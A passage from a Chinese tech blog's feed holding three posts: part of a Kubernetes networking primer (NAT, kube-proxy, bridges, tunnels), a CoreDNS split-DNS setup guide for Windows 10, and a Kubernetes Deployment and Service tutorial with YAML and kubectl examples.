<h3 id="1-2-Windows-下安装"><a href="#1-2-Windows-下安装" class="headerlink" title="1.2 Windows 下安装"></a>1.2 Windows 下安装</h3><p>可以参见我之前的博文 <a href="https://blog.whyun.com/posts/wsl-and-docker-desktop-install/#1-4-docker-desktop-%E4%B8%8B%E9%85%8D%E7%BD%AE-kubernetes">docker desktop 下配置 kubernetes</a> 。</p>
<h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2 原理"></a>2 原理</h2><p>kubernetes 将若干容器进行编排，形成一个集群，但是这个集群最终要对外提供访问能力，才能被使用。kubernetes 自带了 NodePort 和 LoadBalancer 两种模式来让使用者从外部访问集群内的机器。其中 NodePort 和原理和我们路由器中用到的<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转化</a>（<strong>N</strong>etwork <strong>A</strong>ddress <strong>T</strong>ranslation，简称 <code>NAT</code>）是一样的。kubernetes 会对外提供一个端口，用来支持外部应用来访问内部的某一个服务。同时对于内部 pod 来说，每个部署当前服务的节点都会被分配一个特定端口，用来接收“路由器”转发过来的请求。</p>
<blockquote>
<p>pod 是 kubernetes 中的管理单元，其代表集群中一组正在运行的容器。所以说 kubernetes 集群和 pod 之间的数量级关系是 1：N，而 pod 和容器之间的数量级关系是 1：M。</p>
</blockquote>
<p>对于外部访问者来说，它看到的一个服务的访问地址是“路由器”的IP，定义为 <code>IPV</code>，定义在这个“路由器”上的一个指定端口，定义为 <code>PORTD</code>，记这个服务本身为 <code>SERVICEX</code>。“路由器”在读取到这个数据时，首先读取网络层数据包的头部信息，这样就拿到了请求者的源地址。然后读取网络层正文部分数据的前四个字节，也就是传输层的头部信息的前四个字节，这样就得到了请求者的源端口，和它要访问的目的地的端口（也就是 <code>PORTD</code>）。</p>
<p><img src="/images/network_layers.png"></p>
<p><strong>图 2.1</strong></p>
<p><strong>图 2.1</strong> 中橙色的 <code>2</code> 字节的内容即为请求数据的目的端口号，也就是上面我们说到的 <code>PORTD</code> 的值，“路由器”识别到当前请求的端口是 <code>PORTD</code> 的时候，就知道用户是要访问 <code>SERVICEX</code>。然后它就去查找当前 <code>SERVICEX</code> 中部署的节点列表，从中挑选一个，记为 <code>Node1</code>，将请求数据包转发给这个 <code>Node1</code>，不过再转发前会将目的 IP 改为 <code>Node1</code> 的 IP，将目的端口号改为 <code>Node1</code> 上这个服务的监听端口号。</p>
<p><code>Node1</code> 在处理完成之后，将数据包返给“路由器”，源地址写的是 <code>Node1</code> 的 IP，“路由器”收到数据包之后，将源地址改成自己的 IP，转发给请求者。</p>
<p><img src="/images/nat_transform.png"></p>
<p><strong>图 2.2</strong></p>
<p>整个 <code>NAT</code> 过程如上图所示。</p>
<p>考虑到高可靠性的问题，一个服务不可能部署为单节点，为了展示数据流向，我们在 <strong>图 2.2</strong> 只画了一个节点，实际情况应该是多个节点（对于 kubernetes 来说，这个 “节点” 就称之为 pod）的拓扑结构。而在 kubernetes 中我们并不是需要一台专门的机器做路由，我们的路由被内置到了集群中的没一台机器中，对于集群中的每个服务来说在系统中都会映射出一个 <code>虚拟 IP</code>。用户编写代码如果要连接一个特定服务，只需要提供<code>虚拟 IP</code> 和服务端口号即可，内核层会自动查找到当前 <code>虚拟 IP</code> 对应的某一个 pod 节点，把你的网络数据包转发过去。这个转发过程，全都是在一台主机上完成的（橙色区域写的内核空间，由于我们描述的是一台主机的情况，所以各个 pod 是共享的内核。里面画了一个路由器，但是仅仅是用来类比<strong>路由表</strong>的功能。），效率比较高。上面所说的转发，也就是完成了 <strong>图2.2</strong> 中的第 2 步。Pod1 在处理完数据进行回包的时候，将数据交给内核，内核同样需要修改数据包中的源地址（<code>IPV</code>）和源端口号（<code>PORTD</code>），也就是步骤 <code>4</code> 这个过程，不做这个修改 <code>client</code> 会不识别这个回包。<code>PodClient</code> 的内核态具体选择哪个 pod，kubernetes 内置了若干<a href="https://kubernetes.io/zh/docs/concepts/services-networking/service/#proxy-mode-ipvs">算法</a>，比如说 <code>Round-Robin</code> <code>Least Connection</code>，更多说明参见算法链接（使用 IPVS 模式时支持若干算法，但是使用 iptables 时，只支持 <code>Round-Robin</code> 算法）。</p>
<blockquote>
<p>真实的情况下，kubernetes 集群中肯定会部署多台主机，网络情况比当前举例的要更复杂。简单起见这里仅仅描述一台主机的情况。</p>
</blockquote>
<p><img src="/images/route_in_k8s.png"></p>
<p><strong>图 2.3</strong></p>
<p>同时由于集群内部服务的 pod 个数是动态增减的，这样才能灵活应对流量的激增和回退。所以<strong>图 2.3</strong> 中的<strong>路由表</strong>信息如果写死肯定不能应对这种情况。kubernetes 中使用 etcd 来存储数据，它通过 raft 一致性算法来保证数据一致性。一个关联的 pod 有增减之后，就会更改 etcd 数据，kubernetes 中的 kube-proxy 程序会自动监听节点变动，然后把同步修改主机上的 iptables（或者 IPVS 信息）。</p>
<p><img src="/images/pod_meta_update.png"></p>
<p><strong>图 2.4</strong></p>
<p>前面讲的是单主机的情况，但是正式环境的 kubernetes 集群，都是有若干主机组成的。同一主机上的 pod 们是通过网桥进行转发的。上面的讲解中并没有明确主机和 pod 之间的通信细节，如果展开讲的话，其网络拓扑模型是这样的：</p>
<p><img src="/images/pod_net_bridge.png"></p>
<p><strong>图 2.4</strong></p>
<p>pod 和主机之间 通过 veth pair 技术 进行通信，veth pair 类似于管道，一端发送的数据，可以在另一端收到。如果是统一主机上的 pod 们相互通信，就可以借助于网桥。网桥工作在链路层，可以将其理解为现实中的交换机，veth 网卡和网桥之间的连接，可以理解为网络终端通过网线和交换机之间的连接。网桥内部存储每个网口对应的 MAC 地址映射表，数据链路层的数据包到达网桥后，通过查询映射表就可以准发到对应接口了。</p>
<p>然而 Linux 下的网桥，并不是一个纯粹的交换机，交换机或者说传统意义上的网桥只工作在数据链路层，但是 Linux 下的网卡是一块虚拟网卡，上面可以分配 IP，所以它还可以工作在网络层。它的名字叫“网桥”，仅仅是 Linux 内核开发者的自定义称谓而已。</p>
<p>挂载在主机 1 上的 pod 们，ip 可以是 10.1.0.0&#x2F;24，但是挂载到主机 2 上的 pod 们，就不能选用跟他们同一网段，否则就很有可能出现地址冲突的问题。我们假定 主机 2上的 pod 们 ip 地址是 10.2.0.0&#x2F;24。那么这两部分 pod 是不能直接通信的，不过跨网络通信也不是不可能的，我们常用的 VPN 技术就是一种跨网络通信的技术。隧道的原理是，鉴定两个异地的局域网不能相互通信，但是两个局域网所在的网络中都有公网出口，则可以构建了一种隧道技术，将数据链路层的包，外层包裹在传输层中，通过公开网络进行传输，然后到达对端后在提取出内层链路层的包，转发给对应的内部网络终端。所以从抽象一样上看，感觉像是两个局域网是可以在数据链路层相互可见的，但是其实是借助了上述的隧道技术。具体到 kubenetes 中， Flannel、calico、weave 等技术提供了类似隧道功能。由于 kubenetes 中各个主机之间是可以互通的，主机所在的局域网也就成为了刚才流程中的“公开网络”。</p>
<p><img src="/images/k8s_pod_tunnel.png"></p>
<p><strong>图 2.5</strong></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li>LVS负载均衡（LVS简介、三种工作模式、调度原理以及十种调度算法） <a href="https://blog.51cto.com/u_14359196/2424034">https://blog.51cto.com/u_14359196/2424034</a></li>
<li>Cracking kubernetes node proxy (aka kube-proxy) <a href="https://arthurchiao.art/blog/cracking-k8s-node-proxy/">https://arthurchiao.art/blog/cracking-k8s-node-proxy/</a></li>
<li>linux内核网络协议栈–linux bridge（十九）<a href="https://blog.csdn.net/qq_20817327/article/details/106843154">https://blog.csdn.net/qq_20817327/article/details/106843154</a></li>
</ol>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>K8s</category>
      </categories>
  </entry>
  <entry>
    <title>内外网 DNS 分流解决方案</title>
    <url>/posts/local-dns-masq/</url>
    <content><![CDATA[<p>一般公司内部都会有内部 DNS 服务器，由于托管公司内网域名，且会当成公司内部上网的专用 DNS，同时承载外网的域名解析工作。但是有时候公司内网的 DNS 服务不稳定时，就比较尴尬，不用吧，解析不了内网域名，用吧，上不了外网。这时候用 DNS 的分流工具就是解决这个问题的好办法。这篇文章会拿 win10 举例，讲解 coredns 的简单配置，来解决 DNS 分流问题。</p>
<p>首先下载 coredns 安装包 <a href="https://github.com/coredns/coredns/releases/latest">https://github.com/coredns/coredns/releases/latest</a> 将其解压到本地磁盘</p>
<img src="/images/image-20211213114300975.png" alt="image-20211213114300975" style="zoom:50%;" />

<p><strong>图 1.1</strong></p>
<p>这里解压到的是 D:\program2\coredns_1.8.6_windows_amd64\ 这个目录。然后在这个目录中编写 coredns 的配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">(inner) &#123;
    errors
    # 禁用ipv6解析
    rewrite stop type AAAA A
    cache 3
    forward  . 内网DNS服务的IP
    reload
    log
&#125;
 
17zuoye.net &#123;
    import inner
&#125;
 
. &#123;
    any
    errors
    health &#123;
        lameduck 5s
    &#125;
    ready
    forward . 119.29.29.29 223.5.5.5
    cache 30
    reload
    log
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了保证 coredns 能够在windows中开机自启动，还要借助 winsw 这个工具，从 <a href="https://github.com/winsw/winsw/releases">https://github.com/winsw/winsw/releases</a> 中下载最新版本，其中 win10 对应的二进制文件 WinSW.NET461.exe。将 winsw 的二进制文件拷贝到刚才的工作目录，然后重命名为 <strong>coredns-service.exe</strong> 。</p>
<p>接着在刚才的工作目录中创建 coredns-service.xml，输入以下内容</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>CoreDNS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>CoreDNS Service (powered by WinSW)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>This service is a CoreDNS service<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executable</span><span class="token punctuation">></span></span>D:\program2\coredns_1.8.6_windows_amd64\coredns.exe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executable</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>workingdirectory</span><span class="token punctuation">></span></span>D:\program2\coredns_1.8.6_windows_amd64\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>workingdirectory</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>onfailure</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>restart<span class="token punctuation">"</span></span> <span class="token attr-name">delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10 sec<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>startmode</span><span class="token punctuation">></span></span>Automatic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>startmode</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log</span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reset<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过命令 D:\program2\coredns_1.8.6_windows_amd64\coredns-service.exe install 可以在 windows 中将 coredns 安装为系统服务，通过命令 D:\program2\coredns_1.8.6_windows_amd64\coredns-service.exe start 可以在后台启动这个系统服务。上面两个命令只需要在初始化安装的时候执行一次即可，下次开机的时候，就能自动启动 coredns 了，不过需要注意的是运行需要的超管权限。通过命令 D:\program2\coredns_1.8.6_windows_amd64\coredns-service.exe status 可以查看服务状态。</p>
<p>通过命令 nslookup <a href="http://www.baidu.com/">www.baidu.com</a> 127.0.0.1 ，如果返回如下内容</p>
<pre class="line-numbers language-none"><code class="language-none">服务器: localhost
Address: 127.0.0.1
非权威应答:
名称:  www.a.shifen.com
Addresses: 163.177.151.109
     163.177.151.110
Aliases: www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代表配置成功。</p>
<p>最后一步，修改本地上网网卡所用的 DNS 为 127.0.0.1，在 <strong>控制面板\所有控制面板项\网络连接</strong> 中找到你所用的网卡，右键选择属性，在打开的面板中选择双击 <strong>Internet 协议版本 4</strong> ，填写首选 DNS 为 127.0.0.1</p>
<p><img src="/images/image-20211219170741299.png" alt="image-20211219170741299"></p>
]]></content>
      <categories>
        <category>DNS</category>
      </categories>
  </entry>
  <entry>
    <title>k8s 部署文件简谈</title>
    <url>/posts/k8s-yaml/</url>
    <content><![CDATA[<p>在之前的教程 <a href="https://blog.whyun.com/posts/k8s-startup/">k8s 网络原理入门</a> 中，我们了解到更多的是 k8s 如何保证集群内部各个服务在网络上互通。而这篇教程主要是讲实操的内容，会讲如何在 k8s 内部部署服务。</p>
<h2 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1. 基本操作"></a>1. 基本操作</h2><h3 id="1-1-deployment"><a href="#1-1-deployment" class="headerlink" title="1.1 deployment"></a>1.1 deployment</h3><p>首先跟 docker 类似，k8s 的运行基本单元称之为 pod，我们通常会将一组 pod 作为一个部署单元部署到 k8s 集群中，这组 pod 里面的镜像等信息都是相同的。在 k8s 中，这种部署单元被称之为 <code>depolyment</code>，比如说下面这个配置文件就是一个 <code>depolyment</code>：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1	<span class="token comment">#与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本</span>
<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment	<span class="token comment">#该配置的类型，我们使用的是 Deployment</span>
<span class="token key atrule">metadata</span><span class="token punctuation">:</span>	        <span class="token comment">#译名为元数据，即 Deployment 的一些基本属性和信息</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx<span class="token punctuation">-</span>deployment	<span class="token comment">#Deployment 的名称</span>
  <span class="token key atrule">labels</span><span class="token punctuation">:</span>	    <span class="token comment">#标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx	<span class="token comment">#为该Deployment设置key为app，value为nginx的标签</span>
<span class="token key atrule">spec</span><span class="token punctuation">:</span>	        <span class="token comment">#这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用</span>
  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">1</span>	<span class="token comment">#使用该Deployment创建一个应用程序实例</span>
  <span class="token key atrule">selector</span><span class="token punctuation">:</span>	    <span class="token comment">#标签选择器，与上面的标签共同作用，目前不需要理解</span>
    <span class="token key atrule">matchLabels</span><span class="token punctuation">:</span> <span class="token comment">#选择包含标签app:nginx的资源</span>
      <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx
  <span class="token key atrule">template</span><span class="token punctuation">:</span>	    <span class="token comment">#这是选择或创建的Pod的模板</span>
    <span class="token key atrule">metadata</span><span class="token punctuation">:</span>	<span class="token comment">#Pod的元数据</span>
      <span class="token key atrule">labels</span><span class="token punctuation">:</span>	<span class="token comment">#Pod的标签，上面的selector即选择包含标签app:nginx的Pod</span>
        <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx
    <span class="token key atrule">spec</span><span class="token punctuation">:</span>	    <span class="token comment">#期望Pod实现的功能（即在pod中部署）</span>
      <span class="token key atrule">containers</span><span class="token punctuation">:</span>	<span class="token comment">#生成container，与docker中的container是同一种</span>
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx	<span class="token comment">#container的名称</span>
        <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span><span class="token number">1.21</span>	<span class="token comment">#使用镜像nginx:1.21创建container，该container默认80端口可访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1.1 nginx-deployment.yaml</strong></p>
<p>注意到上述代码中的 <code>spec.replicas</code> 属性为 <code>1</code>，这代表当前部署中仅包含一个 pod，使用 <code>kubectl apply -f nginx-deployment.yaml</code> 可以将当前 <code>deployment</code> 部署到集群。</p>
<blockquote>
<p>如果本地没有安装 k8s 环境，可以使用免费的 <a href="https://cloud.okteto.com/">okteto</a> 服务，具体参见教程第 2 节部分。</p>
</blockquote>
<p>部署完之后通过 <code>kubectl get pods</code> 命令，可以看到我们部署成功的 pod 信息：</p>
<pre class="line-numbers language-none"><code class="language-none">NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-5c95dfd78d-27kmw   1&#x2F;1     Running   0          6s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>通过命令 <code>kubectl get deployments</code> 即可以 <code>deployment</code> 的维度查看到刚才部署的 <code>nginx-deployment</code> (这个名字由 <strong>代码 1.1.1</strong> 中的 <code>metadata.name</code> 指定)</p>
<pre class="line-numbers language-none"><code class="language-none">NAME               READY   UP-TO-DATE   AVAILABLE   AGE
nginx-deployment   1&#x2F;1     1            1           44m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果你感觉当前只有一个 pod 不够使，那么可以通过简单的命令就可以进行扩容 <code>kubectl scale deployment nginx-deployment --replicas 2</code> 上述命令会将 <code>nginx-deployment</code> 的 pod 个数增长为 2。再次通过运行 <code>kubectl get pods</code> 命令，会发现新增了一个 pod：</p>
<pre class="line-numbers language-none"><code class="language-none">NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-5c95dfd78d-27kmw   1&#x2F;1     Running   0          58m
nginx-deployment-5c95dfd78d-z5qnh   1&#x2F;1     Running   0          3s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="1-2-service"><a href="#1-2-service" class="headerlink" title="1.2 service"></a>1.2 service</h3><p>我们在上一节中已经将我们的应用部署到了 k8s 集群中，但是目前为止，部署的应用还是不能访问的，如果想让应用能够对外访问需要在 yaml 文件中定义 service。</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1
<span class="token key atrule">kind</span><span class="token punctuation">:</span> Service
<span class="token key atrule">metadata</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> nginx
  <span class="token key atrule">labels</span><span class="token punctuation">:</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx
<span class="token key atrule">spec</span><span class="token punctuation">:</span>
  <span class="token key atrule">ports</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">80</span>
    <span class="token comment">#nodePort: 31701</span>
    <span class="token key atrule">protocol</span><span class="token punctuation">:</span> TCP
  <span class="token key atrule">selector</span><span class="token punctuation">:</span>
    <span class="token key atrule">app</span><span class="token punctuation">:</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2.1 nginx-svc.yaml</strong></p>
<p>注意 <strong>代码 1.2.1</strong> 中的 <code>spec.selector</code> 属性，他会筛选所有 pod 中 lable 名字为 <code>app</code> 且值为 <code>nginx</code> 的节点添加到当前 service 中。同时，根据字段 <code>metadata.name</code> 决定了当前 service 的名字为 <code>nginx</code>。</p>
<p>运行命令 <code>kubectl apply -f nginx-svc.yaml</code> 可以在 k8s 集群中创建当前 service。</p>
<p>同时留意到我们指定属性 <code>spec.ports[0].port</code> 的值为 <code>80</code>，这个属性将新建一个 <code>Cluster IP</code>，同时指定 <code>Cluster IP</code> 上开放 80 端口，作为集群内部机器的访问端口。如果想让集群外部访问，需要指定 <code>nodePort</code> 端口，这个端口会绑定到集群中所有宿主机节点的外网 IP 上（要想启用 nodePort 属性，需要指定 <code>spec.type</code> 属性为 <code>NodePort</code>，<code>sepc.type</code> 的默认值为 <code>ClusterIp</code>）。</p>
<p>通过命令 <code>kubectl get svc nginx</code> 可以查看当前创建的 service 的简介：</p>
<pre class="line-numbers language-none"><code class="language-none">NAME    TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE
nginx   ClusterIP   10.155.128.177   &lt;none&gt;        80&#x2F;TCP    19m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>从上面输出可以得出 nginx 服务的 <code>Cluster IP 为 </code>10.155.128.177&#96;</p>
<p>我们通过命令 <code>kubectl run curl --image=radial/busyboxplus:curl -i --tty</code> 可以创建一个带有 curl 命令支持的 pod，并进入其控制台。输入命令 <code>curl http://10.155.128.177:80</code> ，会得到如下输出：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome to nginx!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
<span class="token selector">html</span> <span class="token punctuation">&#123;</span> <span class="token property">color-scheme</span><span class="token punctuation">:</span> light dark<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token selector">body</span> <span class="token punctuation">&#123;</span> <span class="token property">width</span><span class="token punctuation">:</span> 35em<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 0 auto<span class="token punctuation">;</span>
<span class="token property">font-family</span><span class="token punctuation">:</span> Tahoma<span class="token punctuation">,</span> Verdana<span class="token punctuation">,</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to nginx!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>For online documentation and support please refer to
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://nginx.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>nginx.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
Commercial support is available at
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://nginx.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>nginx.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>Thank you for using nginx.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代表我们的服务没有问题。</p>
<h3 id="1-3-负载均衡"><a href="#1-3-负载均衡" class="headerlink" title="1.3 负载均衡"></a>1.3 负载均衡</h3><p>在之前教程 <a href="https://blog.whyun.com/posts/k8s-startup/">k8s 网络原理入门</a> 中讲到 k8s 中通过 <code>虚 IP</code>，也就是 <code>Cluster IP</code> 来做请求入口 IP，操作系统内核根据  <code>虚 IP</code> 和 请求端口做 NAT 转发。但是这个端口转发还有一个特性，一旦 TCP 报文被转发过一次后，操作系统就记住了当前的请求者的源 IP、源端口号、目的 IP、目的端口号的映射关系，下次报文再过来的时候，就不用再做转发了。这本来是一个利于性能的方案，但是同样会导致新的问题。</p>
<p>如果当前的请求是 http 1.0 协议或者没有启动 keep alive 的 1.1 协议，那么请求在发送完一次后，句柄立马就销毁了，下次请求会重新创建新的句柄，操作系统内核会重新走一遍端口转发，由于操作系统做 NAT 的时候，是随机选择一个 pod IP，所以从客户端的角度来说，负载可以认为均衡的。</p>
<p>不过如果我们的请求是长连接（比如普通 TCP 请求、启用了 keep alive 的 http 1.1、http 2.0 等创建的连接），那么请求者在发送完一次请求后，句柄还是复用的。这时候如果请求者的数目低于服务者的数目，就会导致一个很尴尬的事情，有些服务器可能不会得到请求者的光临而处于饥饿状态。</p>
<p>k8s 本身没有提供负载均衡解决方案，虽然它预留了 <code>LoadBalancer</code> 类型的 service 定义（也就是将 <strong>代码 1.2.1</strong> 中的 <code>spec.type</code> 改为 <code>LoadBalancer</code> ），但是官方却没有给出具体实现方式。也就是说你自建一个 k8s 集群的话，是没有负载均衡功能的，不过你使用 阿里云、谷歌云之类的云服务倒是都实现 <code>LoadBalancer</code>，不过那就需要牵扯到付费服务了。</p>
<p>业内对于这个问题的解决方案大体上分为一下几个个思路，一个是使用类似 Istio 、Linkerd 这些 Service Mesh 解决方案，不但给你解决负载均衡问题，还令带给你解决流量管控等问题，不过这种全家桶类型的解决方案对于原有架构来说是一个重大的升级。如果想追求，还可以使用一些第三方的反代工具，比如说 Envoy 。还有一种方案是直接对接 k8s 的 API，在客户端做服务发现和负载均衡，彻底做到自研。当然如果你想脱离 k8s 自身的服务转而使用第三方的服务发现组件，比如说 consul，也算是一种选择，主要看当前项目组在哪方面技术积累更深厚了。</p>
<h2 id="2-免费-k8s-资源"><a href="#2-免费-k8s-资源" class="headerlink" title="2. 免费 k8s 资源"></a>2. 免费 k8s 资源</h2><p>由于 k8s 环境搭建需要一定的时间，且需要耗费一定的硬件资源，如果手动暂时没有 k8s 环境的话，可能连第 1 小节练习 k8s 命令的机会都没有。不过，不要慌，<a href="https://cloud.okteto.com/">https://cloud.okteto.com/</a> 上可以申请免费的 k8s 资源，只需要用 github 账户登录即可。它最多可以创建 10 个 pod，一般练习使用够用了。不过毕竟是免费的，有一些功能是不能用的，比如说创建 NodePort 类型的 service、修改操作系统内核参数等若干影响到宿主机的功能是不给提供的。</p>
<p>接着点击左侧 <strong>Settings</strong> 菜单，然后点击按钮 <strong>Download Config File</strong>，然后会弹出设置 <code>KUBECONFIG</code> 环境变量的提示框，将其命令拷贝到终端执行，则当前终端中就能直接找到 k8s 的配置文件，否则的话你执行 kubectl 命令的时候，都需要添加 <code>--kubeconfig</code> 的参数。</p>
<p><img src="/images/image-20220227203214263.png" alt="image-20220227203214263"></p>
<p><strong>图 2.1</strong></p>
<img src="/images/image-20220227203127277.png" alt="image-20220227203127277" style="zoom: 80%;" />

<p><strong>图 2.2</strong></p>
